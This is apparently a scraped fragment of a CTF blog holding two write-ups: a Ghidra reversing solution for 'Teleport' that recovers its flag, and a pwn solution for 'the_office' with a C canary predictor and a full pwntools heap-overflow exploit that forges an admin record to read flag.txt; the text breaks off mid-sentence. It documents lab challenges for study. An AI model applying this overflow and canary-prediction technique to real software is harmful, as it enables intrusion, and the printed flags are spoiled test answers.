BuildID[sha1]=1f87fe68fd7d1deaffefcf08ed2b30d660ee2d0b, stripped  If we run it, it asks for a password:\n$ ./teleport Missing password  We can try to add it as a command line argument:\n$ ./teleport asdf Something's wrong... $ ./teleport 'HTB{asdf}' Something's wrong...  Using ltrace we see that the input is copied at some memory address and then there are a lot of jumps (44 calls to _setjmp):\n$ ltrace ./teleport asdf strncpy(0x5571e7a03280, \"asdf\", 100) = 0x5571e7a03280 _setjmp(0x5571e7a04430, 5, 0x5571e7800e16, 0x666473) = 0 _setjmp(0x5571e7a04fe8, 0, 0x5571e7800d8e, 0x666473) = 0 _setjmp(0x5571e7a033c8, 0, 0x5571e7801256, 0x666473) = 0 _setjmp(0x5571e7a04b38, 0, 0x5571e78015ca, 0x666473) = 0 _setjmp(0x5571e7a05240, 0, 0x5571e7800f26, 0x666473) = 0 _setjmp(0x5571e7a041d8, 0, 0x5571e78014ba, 0x666473) = 0 _setjmp(0x5571e7a04e58, 0, 0x5571e7800bf6, 0x666473) = 0 _setjmp(0x5571e7a04f20, 0, 0x5571e78013aa, 0x666473) = 0 _setjmp(0x5571e7a04c00, 0, 0x5571e7801146, 0x666473) = 0 _setjmp(0x5571e7a03620, 0, 0x5571e7800d4a, 0x666473) = 0 _setjmp(0x5571e7a037b0, 0, 0x5571e7801542, 0x666473) = 0 _setjmp(0x5571e7a04688, 0, 0x5571e780129a, 0x666473) = 0 _setjmp(0x5571e7a03558, 0, 0x5571e7800b2a, 0x666473) = 0 _setjmp(0x5571e7a04048, 0, 0x5571e780160e, 0x666473) = 0 _setjmp(0x5571e7a03a08, 0, 0x5571e7800ee2, 0x666473) = 0 _setjmp(0x5571e7a04818, 0, 0x5571e7800bb2, 0x666473) = 0 _setjmp(0x5571e7a04d90, 0, 0x5571e7800fae, 0x666473) = 0 _setjmp(0x5571e7a04cc8, 0, 0x5571e780107a, 0x666473) = 0 _setjmp(0x5571e7a04a70, 0, 0x5571e78013ee, 0x666473) = 0 _setjmp(0x5571e7a044f8, 0, 0x5571e78012de, 0x666473) = 0 _setjmp(0x5571e7a03eb8, 0, 0x5571e7801432, 0x666473) = 0 _setjmp(0x5571e7a049a8, 0, 0x5571e7801212, 0x666473) = 0 _setjmp(0x5571e7a05308, 0, 0x5571e7800ff2, 0x666473) = 0 _setjmp(0x5571e7a053d0, 0, 0x5571e7801652, 0x666473) = 0 _setjmp(0x5571e7a036e8, 0, 0x5571e7800b6e, 0x666473) = 0 _setjmp(0x5571e7a03490, 0, 0x5571e7800d06, 0x666473) = 0 _setjmp(0x5571e7a03d28, 0, 0x5571e7800c3a, 0x666473) = 0 _setjmp(0x5571e7a05178, 0, 0x5571e7801322, 0x666473) = 0 _setjmp(0x5571e7a03878, 0, 0x5571e78014fe, 0x666473) = 0 _setjmp(0x5571e7a03b98, 0, 0x5571e7800c7e, 0x666473) = 0 _setjmp(0x5571e7a04368, 0, 0x5571e7801586, 0x666473) = 0 _setjmp(0x5571e7a03300, 0, 0x5571e78011ce, 0x666473) = 0 _setjmp(0x5571e7a042a0, 0, 0x5571e7800e9e, 0x666473) = 0 _setjmp(0x5571e7a04110, 0, 0x5571e7801036, 0x666473) = 0 _setjmp(0x5571e7a03f80, 0, 0x5571e7801366, 0x666473) = 0 _setjmp(0x5571e7a03df0, 0, 0x5571e7800cc2, 0x666473) = 0 _setjmp(0x5571e7a03c60, 0, 0x5571e7800dd2, 0x666473) = 0 _setjmp(0x5571e7a03940, 0, 0x5571e7801476, 0x666473) = 0 _setjmp(0x5571e7a03ad0, 0, 0x5571e780118a, 0x666473) = 0 _setjmp(0x5571e7a04750, 0, 0x5571e7801102, 0x666473) = 0 _setjmp(0x5571e7a045c0, 0, 0x5571e7800e5a, 0x666473) = 0 _setjmp(0x5571e7a050b0, 0, 0x5571e7800f6a, 0x666473) = 0 _setjmp(0x5571e7a048e0, 0, 0x5571e78010be, 0x666473) = 0 _setjmp(0x5571e7a031a0, 0, 0x4b055124abc880dc, 0x666473) = 0 longjmp(0x5571e7a03300, 1, 0x5571e7a03300, 0x666473 \u0026lt;unfinished ...\u0026gt; longjmp(0x5571e7a031a0, 101, 0x5571e78011de, 0x666473 \u0026lt;unfinished ...\u0026gt; puts(\"Something's wrong...\"Something's wrong... ) = 21 \u0026lt;... longjmp resumed ) = 21 +++ exited (status 0) +++  At this point, we can open the binary in Ghidra and analyze it. This is the main function:\nundefined8 main(int param_1, long param_2) { int iVar1; undefined8 uVar2; uint i; if (param_1 == 2) { strncpy(\u0026amp;DAT_00303280, *(char **) (param_2 + 8), 100); for (i = 0; i \u0026lt; 43; i++) { (*(code *) (\u0026amp;PTR_FUN_00303020)[(int) i])(); } iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0); if (iVar1 == 100) { puts(\"Looks good to me!\"); } else { if (iVar1 != 101) { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) (\u0026amp;DAT_00303300 + (long) iVar1 * 200), 1); } puts(\"Something\\'s wrong...\"); } uVar2 = 0; } else { puts(\"Missing password\"); uVar2 = -1; } return uVar2; }  Almost all the jumps (43) are done inside the for loop, and the last jump is right after it. Inside the loop it is calling some functions stored in an array (PTR_FUN_00303020). If we examine this memory space, we will see a lot of functions (43 in total):\nPTR_FUN_00303020 XREF[2]: main:001016f6(*), main:001016fd(R) 00303020 16 0e 10 addr FUN_00100e16 00 00 00 00 00 00303028 8e 0d 10 addr FUN_00100d8e 00 00 00 00 00 00303030 56 12 10 addr FUN_00101256 00 00 00 00 00 00303038 ca 15 10 addr FUN_001015ca 00 00 00 00 00 00303040 26 0f 10 addr FUN_00100f26 00 00 00 00 00 00303048 ba 14 10 addr FUN_001014ba 00 00 00 00 00 00303050 f6 0b 10 addr FUN_00100bf6 00 00 00 00 00 00303058 aa 13 10 addr FUN_001013aa 00 00 00 00 00 00303060 46 11 10 addr FUN_00101146 00 00 00 00 00 00303068 4a 0d 10 addr FUN_00100d4a 00 00 00 00 00 00303070 42 15 10 addr FUN_00101542 00 00 00 00 00 00303078 9a 12 10 addr FUN_0010129a 00 00 00 00 00 00303080 2a 0b 10 addr FUN_00100b2a 00 00 00 00 00 00303088 0e 16 10 addr FUN_0010160e 00 00 00 00 00 00303090 e2 0e 10 addr FUN_00100ee2 00 00 00 00 00 00303098 b2 0b 10 addr FUN_00100bb2 00 00 00 00 00 003030a0 ae 0f 10 addr FUN_00100fae 00 00 00 00 00 003030a8 7a 10 10 addr FUN_0010107a 00 00 00 00 00 003030b0 ee 13 10 addr FUN_001013ee 00 00 00 00 00 003030b8 de 12 10 addr FUN_001012de 00 00 00 00 00 003030c0 32 14 10 addr FUN_00101432 00 00 00 00 00 003030c8 12 12 10 addr FUN_00101212 00 00 00 00 00 003030d0 f2 0f 10 addr FUN_00100ff2 00 00 00 00 00 003030d8 52 16 10 addr FUN_00101652 00 00 00 00 00 003030e0 6e 0b 10 addr FUN_00100b6e 00 00 00 00 00 003030e8 06 0d 10 addr FUN_00100d06 00 00 00 00 00 003030f0 3a 0c 10 addr FUN_00100c3a 00 00 00 00 00 003030f8 22 13 10 addr FUN_00101322 00 00 00 00 00 00303100 fe 14 10 addr FUN_001014fe 00 00 00 00 00 00303108 7e 0c 10 addr FUN_00100c7e 00 00 00 00 00 00303110 86 15 10 addr FUN_00101586 00 00 00 00 00 00303118 ce 11 10 addr FUN_001011ce 00 00 00 00 00 00303120 9e 0e 10 addr FUN_00100e9e 00 00 00 00 00 00303128 36 10 10 addr FUN_00101036 00 00 00 00 00 00303130 66 13 10 addr FUN_00101366 00 00 00 00 00 00303138 c2 0c 10 addr FUN_00100cc2 00 00 00 00 00 00303140 d2 0d 10 addr FUN_00100dd2 00 00 00 00 00 00303148 76 14 10 addr FUN_00101476 00 00 00 00 00 00303150 8a 11 10 addr FUN_0010118a 00 00 00 00 00 00303158 02 11 10 addr FUN_00101102 00 00 00 00 00 00303160 5a 0e 10 addr FUN_00100e5a 00 00 00 00 00 00303168 6a 0f 10 addr FUN_00100f6a 00 00 00 00 00 00303170 be 10 10 addr FUN_001010be 00 00 00 00 00  Let\u0026rsquo;s take a look at the first three functions:\nvoid FUN_00100e16() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_00304430); if (iVar1 == 0) { return; } if (DAT_00303296 == 'p') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 23); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); } void FUN_00100d8e() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_00304fe8); if (iVar1 == 0) { return; } if (DAT_003032a5 == 'n') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 38); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); } void FUN_00101256() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_003033c8); if (iVar1 == 0) { return; } if (DAT_00303281 == 'T') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 2); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); }  They are calling _setjmp (as expected) and then comparing some byte to a given character. If they are different, it calls longjmp using 101 as a parameter. In main we saw that if 101 is returned from the last _setjmp, then the password is not correct.\nHence, these functions are checking the bytes of the input password, but not in order. Also, notice that our password is copied into DAT_00303280, and the three functions above are checking bytes at DAT_00303296, DAT_003032a5 and DAT_00303281, respectively. So p, n and T might be valid characters of the password.\nAt this point, we can export the decompiled C code from Ghidra into a file and use some shell scripting to extract these instructions, sort them and join them to get the password:\n$ grep \\(DAT_003032 teleport.c if (DAT_00303283 == '{') { if (DAT_00303285 == 'u') { if (DAT_0030329b == 't') { if (DAT_003032a3 == 't') { if (DAT_0030328d == 'h') { if (DAT_0030328b == '_') { if (DAT_0030328e == 'r') { if (DAT_00303282 == 'B') { if (DAT_00303284 == 'j') { if (DAT_003032a5 == 'n') { if (DAT_0030328c == 't') { if (DAT_00303296 == 'p') { if (DAT_00303298 == 'c') { if (DAT_00303294 == '_') { if (DAT_00303289 == 'n') { if (DAT_003032a8 == 'm') { if (DAT_003032a6 == 'u') { if (DAT_003032a2 == 'n') { if (DAT_003032a9 == '!') { if (DAT_00303292 == 'h') { if (DAT_003032a1 == '0') { if (DAT_0030329c == '1') { if (DAT_0030329a == '_') { if (DAT_003032a0 == 'c') { if (DAT_0030328a == 'g') { if (DAT_00303280 == 'H') { if (DAT_0030329d == 'm') { if (DAT_00303281 == 'T') { if (DAT_00303299 == '3') { if (DAT_00303297 == '4') { if (DAT_003032a7 == 'u') { if (DAT_00303290 == '_') { if (DAT_003032a4 == '1') { if (DAT_0030329e == '3') { if (DAT_0030328f == 'u') { if (DAT_00303288 == '1') { if (DAT_00303293 == '3') { if (DAT_00303287 == 'p') { if (DAT_00303286 == 'm') { if (DAT_00303295 == 's') { if (DAT_0030329f == '_') { if (DAT_00303291 == 't') { if (DAT_003032aa == '}') { $ grep \\(DAT_003032 teleport.c | cut -c7-24 DAT_00303283 == '{ DAT_00303285 == 'u DAT_0030329b == 't DAT_003032a3 == 't DAT_0030328d == 'h DAT_0030328b == '_ DAT_0030328e == 'r DAT_00303282 == 'B DAT_00303284 == 'j DAT_003032a5 == 'n DAT_0030328c == 't DAT_00303296 == 'p DAT_00303298 == 'c DAT_00303294 == '_ DAT_00303289 == 'n DAT_003032a8 == 'm DAT_003032a6 == 'u DAT_003032a2 == 'n DAT_003032a9 == '! DAT_00303292 == 'h DAT_003032a1 == '0 DAT_0030329c == '1 DAT_0030329a == '_ DAT_003032a0 == 'c DAT_0030328a == 'g DAT_00303280 == 'H DAT_0030329d == 'm DAT_00303281 == 'T DAT_00303299 == '3 DAT_00303297 == '4 DAT_003032a7 == 'u DAT_00303290 == '_ DAT_003032a4 == '1 DAT_0030329e == '3 DAT_0030328f == 'u DAT_00303288 == '1 DAT_00303293 == '3 DAT_00303287 == 'p DAT_00303286 == 'm DAT_00303295 == 's DAT_0030329f == '_ DAT_00303291 == 't DAT_003032aa == '} $ grep \\(DAT_003032 teleport.c | cut -c7-24 | sort DAT_00303280 == 'H DAT_00303281 == 'T DAT_00303282 == 'B DAT_00303283 == '{ DAT_00303284 == 'j DAT_00303285 == 'u DAT_00303286 == 'm DAT_00303287 == 'p DAT_00303288 == '1 DAT_00303289 == 'n DAT_0030328a == 'g DAT_0030328b == '_ DAT_0030328c == 't DAT_0030328d == 'h DAT_0030328e == 'r DAT_0030328f == 'u DAT_00303290 == '_ DAT_00303291 == 't DAT_00303292 == 'h DAT_00303293 == '3 DAT_00303294 == '_ DAT_00303295 == 's DAT_00303296 == 'p DAT_00303297 == '4 DAT_00303298 == 'c DAT_00303299 == '3 DAT_0030329a == '_ DAT_0030329b == 't DAT_0030329c == '1 DAT_0030329d == 'm DAT_0030329e == '3 DAT_0030329f == '_ DAT_003032a0 == 'c DAT_003032a1 == '0 DAT_003032a2 == 'n DAT_003032a3 == 't DAT_003032a4 == '1 DAT_003032a5 == 'n DAT_003032a6 == 'u DAT_003032a7 == 'u DAT_003032a8 == 'm DAT_003032a9 == '! DAT_003032aa == '}  And there we have the password sorted. And it\u0026rsquo;s the flag:\n$ grep \\(DAT_003032 teleport.c | cut -c7-24 | sort | cut -c18- | tr -d '\\n' HTB{jump1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!} $ ./teleport 'HTB{jump1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}' Looks good to me!  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/teleport/","section":"ctf","summary":"Static code analysis with Ghidra","time":9,"title":"Teleport"},{"contents":"We are given a 32-bit binary called the_office:\nArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  The challenge says that they have implemented a secure heap using canaries.\nWe do not have the C source code. Hence, we need to use a reversing tool like Ghidra.\nAlthough the file is stripped:\n$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd5f440d82f17865303f292401c3e1ea843a0e25, stripped  We can identify the main function because it is the argument of __libc_start_main:\nvoid entry() { __libc_start_main(FUN_08048e49); do { /* WARNING: Do nothing block with infinite loop */ } while(true); }  So we can rename it to main, and here we have it:\nundefined4 main(undefined4 param_1, undefined4 *param_2) { undefined4 *puVar1; char cVar2; int iVar3; int iVar4; undefined4 uVar5; int in_GS_OFFSET; int local_64; int local_60; int local_5c; int local_58; int local_54; int local_50 [11]; int local_24; undefined *local_14; puVar1 = param_2; local_14 = (undefined *) \u0026amp;param_1; local_24 = *(int *) (in_GS_OFFSET + 0x14); setbuf(stdout, (char *) 0x0); for (local_60 = 0; local_60 \u0026lt; 10; local_60 = local_60 + 1) { local_50[local_60 + 1] = 0; } local_5c = 3; do { if (local_5c == 0) { uVar5 = 0; LAB_080490d4: if (local_24 != *(int *) (in_GS_OFFSET + 0x14)) { uVar5 = FUN_08049bd0(); } return uVar5; } local_64 = -1; if (local_5c == 2) { puts(\"Employee #?\"); iVar4 = __isoc99_scanf(\"%1d\", \u0026amp;local_64); if (((iVar4 == 1) \u0026amp;\u0026amp; (-1 \u0026lt; local_64)) \u0026amp;\u0026amp; (local_64 \u0026lt; 10)) { do { local_50[0] = getchar(); if (local_50[0] == 10) break; } while (local_50[0] != -1); FUN_08048cdc(local_50[local_64 + 1]); local_50[local_64 + 1] = 0; } else { puts(\"Invalid ID.\"); } } else if (local_5c \u0026lt; 3) { if (local_5c == 1) { for (local_58 = 0; (local_58 \u0026lt; 0xb \u0026amp;\u0026amp; ((local_64 = local_58, 9 \u0026lt; local_58 || (local_50[local_58 + 1] != 0)))); local_58 = local_58 + 1) { } iVar4 = local_64; if (local_64 \u0026lt; 10) { iVar3 = add_employee(); local_50[iVar4 + 1] = iVar3; } else { puts(\"Can\\'t add any more employees.\"); } } } else if (local_5c == 3) { for (local_54 = 0; local_54 \u0026lt; 10; local_54 = local_54 + 1) { if (local_50[local_54 + 1] != 0) { print_employee(local_50[local_54 + 1], local_54); } } } else if (local_5c == 4) { puts(\"Employee #?\"); iVar4 = __isoc99_scanf(\"%1d\", \u0026amp;local_64); if (((iVar4 == 1) \u0026amp;\u0026amp; (-1 \u0026lt; local_64)) \u0026amp;\u0026amp; (local_64 \u0026lt; 10)) { do { local_50[0] = getchar(); if (local_50[0] == 10) break; } while (local_50[0] != -1); get_access_token(local_50[local_64 + 1]); } else { puts(\"Invalid ID.\"); } } cVar2 = debug(0); if (cVar2 != '\\x01') { printf(\"*** heap smashing detected ***: %s terminated\\n\", *puVar1); uVar5 = 0xffffffff; goto LAB_080490d4; } local_5c = menu(); } while(true); }  The code is a bit large. Let\u0026rsquo;s run it and see what it does:\n$ ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token  We have some functionalities. On the previous code for main, I already identified some functions and renamed them. For example, this is get_access_token:\nvoid get_access_token(char *param_1) { int iVar1; FILE *__stream; char *pcVar2; int in_GS_OFFSET; char local_90[128]; int local_10; local_10 = *(int *) (in_GS_OFFSET + 0x14); iVar1 = strncmp(param_1, \"admin\", 6); if (iVar1 != 0) { puts(\"Not admin\"); if (local_10 != *(int *) (in_GS_OFFSET + 0x14)) { FUN_08049bd0(); } return; } __stream = fopen(\"flag.txt\", \"r\"); if (__stream == (FILE *) 0x0) { puts(\"Unable to open flag!\"); /* WARNING: Subroutine does not return */ exit(-1); } pcVar2 = fgets(local_90, 0x7f, __stream); if (pcVar2 != (char *) 0x0) { puts(local_90); fclose(__stream); /* WARNING: Subroutine does not return */ exit(0); } puts(\"Unable to read flag!\"); /* WARNING: Subroutine does not return */ exit(-1); }  As we can see, if the username for an employee is admin, we can read the flag. This is the function to add an employee:\nchar * add_employee() { int iVar1; undefined4 uVar2; int in_GS_OFFSET; char local_9d; char *local_9c; size_t local_98; char local_94; char local_90[128]; int local_10; local_10 = *(int *) (in_GS_OFFSET + 0x14); local_9c = (char *) FUN_080494be(0x28); if (local_9c == (char *) 0x0) { puts(\"Ran out of memory!\"); /* WARNING: Subroutine does not return */ exit(-1); } local_9d = '\\0'; local_98 = 0; printf(\"Name: \"); iVar1 = __isoc99_scanf(\"%15s\", local_9c); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == L'\\n') break; } while (_local_94 != -1); iVar1 = strncmp(local_9c, \"admin\", 6); if (iVar1 == 0) { puts(\"Cannot be admin!\"); /* WARNING: Subroutine does not return */ exit(-1); } printf(\"Email (y/n)? \"); iVar1 = __isoc99_scanf(\"%c\", \u0026amp;local_9d); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == L'\\n') break; } while (_local_94 != -1); if ((local_9d == 'n') || (local_9d == 'N')) { *(undefined4 *)(local_9c + 0x10) = 0; } else { printf(\"Email address: \"); iVar1 = __isoc99_scanf(\"%127s\", local_90); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); local_98 = strnlen(local_90, 0x7f); uVar2 = FUN_080494be(local_98 + 1); *(undefined4 *) (local_9c + 0x10) = uVar2; if (*(int *) (local_9c + 0x10) == 0) { puts(\"Ran out of memory!\"); /* WARNING: Subroutine does not return */ exit(-1); } strncpy(*(char **) (local_9c + 0x10), local_90, local_98); *(undefined *) (local_98 + *(int *) (local_9c + 0x10)) = 0; } printf(\"Salary: \"); iVar1 = __isoc99_scanf(\"%u\", local_9c + 0x14); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); printf(\"Phone #: \"); iVar1 = __isoc99_scanf(\"%s\", local_9c + 0x18); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); printf(\"Bldg (y/n)? \"); iVar1 = __isoc99_scanf(\"%c\", \u0026amp;local_9d); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); if ((local_9d != 'n') \u0026amp;\u0026amp; (local_9d != 'N')) { printf(\"Bldg #: \"); iVar1 = __isoc99_scanf(\"%u\", local_9c + 0x24); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); } putchar(10); if (local_10 != *(int *) (in_GS_OFFSET + 0x14)) { local_9c = (char *) FUN_08049bd0(); } return local_9c; }  In the code, we see that we cannot create an employee using admin as username. Moreover, we observe that Phone # is vulnerable to Buffer Overflow, because it does not limit the length of the string we can enter:\nprintf(\"Phone #: \"); iVar1 = __isoc99_scanf(\"%s\", local_9c + 0x18);  We can try to overflow it:\n$ ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: asdf Email (y/n)? n Salary: 1234 Phone #: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Bldg (y/n)? n *** heap smashing detected ***: ./the_office terminated  There is a canary protecting the heap overflow attacks. Let\u0026rsquo;s use GDB to see how the heap is handled:\n$ gdb -q the_office Reading symbols from the_office... (No debugging symbols found in the_office) gef➤ break puts Breakpoint 1 at 0x8048600 gef➤ run Starting program: ./the_office Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: AAAA Email (y/n)? n Salary: 255 Phone #: BBBB Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  To search for the heap addresses, we can simply search for AAAA, which is the name of the employee:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In (0xf7ffb000-0xf7ffc000), permission=rw- 0xf7ffb00c - 0xf7ffb010 → \"AAAA\" gef➤ x/32x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000fb4 0x00000035 0x00000000 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000  That\u0026rsquo;s it, we have the canary there. To bypass it, we need to leak it or compute it before exploiting the Buffer Overflow vulnerability. Then, we can use the overflow to modify the name of the next employee and rename it as admin.\nSince it is a home-made canary, we can see how it is generated. Actually, there is a function inside the binary that prints some debugging information about the heap, but it is disabled. However, we have the decompiled source code:\nundefined4 FUN_08049240() { undefined4 uVar1; uint __seed; if (DAT_0804c070 == (void *) 0x0) { DAT_0804c074 = mmap((void *) 0x0, 0x1000, 3, 0x22, -1, 0); if ((DAT_0804c074 == (void *) 0xffffffff) || (DAT_0804c074 == (void *) 0x0)) { puts(\"Memory Error :(\"); uVar1 = 0; } else { __seed = time((time_t *) 0x0); srand(__seed); DAT_0804c06c = rand(); DAT_0804c078 = (int) DAT_0804c074 + 0x1000; DAT_0804c070 = DAT_0804c074; FUN_080491f0(DAT_0804c074, 0x1000 - DAT_0804c060, 0, 0, 1); uVar1 = 1; } } else { uVar1 = 1; } return uVar1; }  It is using srand to set a time-based seed and rand to generate the canary using a Pseudo Random Number Generator (PRNG). This is really similar to seed-sPRiNG.\nWe can use a simple C code to generate a random number using the same method above:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main(int argc, char** argv) { time_t t = time(0); if (argc == 2) { t += atoi(argv[1]); } else { exit(1); } srand(t); printf(\"%d\\n\", rand()); return 0; }  We can compile the code and use it like this:\n$ gcc -o canary canary.c $ ./canary 0 1073673904 $ ./canary 1 156048449  The number passed as argument is just an offset in case the remote instance is not synchronized with our local machine.\nLet\u0026rsquo;s create another user using GDB and visualize the strategy:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: CCCC Email (y/n)? n Salary: 127 Phone #: DDDD Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  If we remove the first employee, we see that its data is not erased:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 2 Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ continue Continuing. Employee #? 0 Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000034 0x00000001 0x41414141 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x000000ff 0x42424242 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000034 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  The only difference with the previous heap status is that there are some 0x34 instead of 0x35 (which means that the chunk is no more used, not allocated). This functionality tries to mimic free, because if we create another employee, we overwrite this released chunk:\ngef➤ continue Continuing. 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token 1 Name: EEEE Email (y/n)? n Salary: 65535 Phone #: FFFF Bldg (y/n)? n Breakpoint 1, 0xf7e3e290 in puts () from /lib32/libc.so.6  gef➤ x/40x 0xf7ffb000 0xf7ffb000: 0x1a3e675e 0x00000035 0x00000001 0x45454545 0xf7ffb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb020: 0x0000ffff 0x46464646 0x00000000 0x00000000 0xf7ffb030: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb040: 0x1a3e675e 0x00000035 0x00000035 0x43434343 0xf7ffb050: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb060: 0x0000007f 0x44444444 0x00000000 0x00000000 0xf7ffb070: 0x00000000 0x00000000 0x00000000 0x00000000 0xf7ffb080: 0x1a3e675e 0x00000f74 0x00000035 0x00000000 0xf7ffb090: 0x00000000 0x00000000 0x00000000 0x00000000  At this point, we could have exploited the Buffer Overflow vulnerability (overwriting the canary with the same value) and modify the second employee\u0026rsquo;s username.\nIn order to automate it, we can use this Python exploit using pwntools:\n#!/usr/bin/env python3 from pwn import context, log, p32, process, remote, sys context.binary = 'the_office' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def compute_canary(offset): with context.local(log_level='CRITICAL'): canary_process = process(['canary', str(offset)]) canary = int(canary_process.recvline().decode()) canary_process.close() return canary def add_employee(p, name=b'a', salary=b'1', phone=b'b'): p.sendlineafter(b'token', b'1') p.sendlineafter(b'Name: ', name) p.sendlineafter(b'Email (y/n)? ', b'n') p.sendlineafter(b'Salary: ', salary) p.sendlineafter(b'Phone #: ', phone) p.sendlineafter(b'Bldg (y/n)? ', b'n') def main(): offset = 0 while True: log.info(f'Testing offset: {offset}') p = get_process() canary = compute_canary(offset) log.info(f'Computed heap canary: {hex(canary)}') add_employee(p) add_employee(p) p.sendlineafter(b'token', b'2') p.sendlineafter(b'Employee #?\\n', b'0') add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin') try: p.sendlineafter(b'token', b'4') except EOFError: offset += 1 continue p.sendlineafter(b'Employee #?\\n', b'1') break log.success(f'Flag: {p.recvline().decode()}') p.close() if __name__ == '__main__': main()  Notice that the malicious payload consists of 28 characters to reach the canary, then the random value of the canary (generated using the previous C code), then two 0x00000035 to keep the chunk metadata, and after that we put admin as username for the second employee. Once there, we can just get the access token (the flag).\nLet\u0026rsquo;s run it locally:\n$ echo THISISTHEFLAG  flag.txt $ python3 solve.py [*] './the_office' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Testing offset: 0 [+] Starting local process './the_office': pid 2018360 [*] Computed heap canary: 0x25399862 [+] Flag: THISISTHEFLAG [*] Process './the_office' stopped with exit code 0 (pid 2018360)  Now we can try it on the remote instance and get 